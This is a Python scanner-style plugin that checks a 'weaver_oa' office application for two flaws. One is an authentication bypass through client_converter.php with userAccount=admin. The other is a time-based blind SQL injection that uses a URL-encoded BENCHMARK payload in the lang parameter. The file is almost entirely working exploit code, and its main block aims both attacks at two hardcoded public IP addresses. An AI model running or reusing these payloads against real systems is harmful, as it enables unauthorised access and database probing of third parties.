#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0124503

import re
import time

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg

        
        
def audit(arg):
    payload1 = 'client_converter.php?userAccount=admin&lang=cn'
    payload2 = 'general/system/user/userlist.php'
    url1 = arg + payload1
    code1, head1, res1, errcode1, _ = curl.curl2(url1)
    url2 = arg + payload2
    code2, head2, res2, errcode2, _ = curl.curl2(url2)
    if code2 == 200 and 'delete_user(DEPT_ID,USER_ID,USER_NAME)' in res2 :
        security_hole(url1 + "   :Background bypass")
        
    payload1 = 'client_converter.php?lang=%28SELECT%20%28CASE%20WHEN%20%288939%3D8939%29%20THEN%20%28SELECT%20BENCHMARK%282500000%2CMD5%28123%29%29%29%20ELSE%208939%2a%28SELECT%208939%20FROM%20mysql.db%29%20END%29%29&userAccount=abc'
    payload2 = 'client_converter.php?lang=1userAccount=abc'
    url1 = arg + payload1
    url2 = arg + payload2
    t1 = time.time()
    code1, head1, res1, errcode1, _ = curl.curl2(url1)
    t2 = time.time()
    code2, head2, res2, errcode2, _ = curl.curl2(url2)
    t3 = time.time()
    if 2*t2-t1-t3 > 3 :
        security_hole(url1 + "   :time-based blind")
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])
    audit(assign('weaver_oa', 'http://211.99.196.116:554/')[1])